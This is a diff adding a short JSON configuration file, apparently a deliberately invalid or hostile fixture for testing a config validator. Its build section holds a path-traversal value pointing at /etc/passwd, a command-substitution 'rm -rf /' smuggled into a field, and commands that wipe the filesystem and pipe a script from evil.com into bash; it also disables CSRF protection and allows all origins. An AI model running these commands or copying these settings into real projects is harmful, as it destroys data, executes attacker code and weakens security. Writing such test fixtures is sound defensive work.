@@ -1,0 +1,17 @@
+{
+	"server": {
+		"host": "0.0.0.0",
+		"port": -1,
+		"readTimeout": "invalid"
+	},
+	"build": {
+		"outputDir": "../../../etc/passwd",
+		"sourceDir": "$(rm -rf /)",
+		"commands": ["rm -rf /", "curl evil.com/shell.sh | bash"]
+	},
+	"security": {
+		"enableCSRFProtection": false,
+		"allowedOrigins": ["*"],
+		"maxRequestSize": "999999GB"
+	}
+}
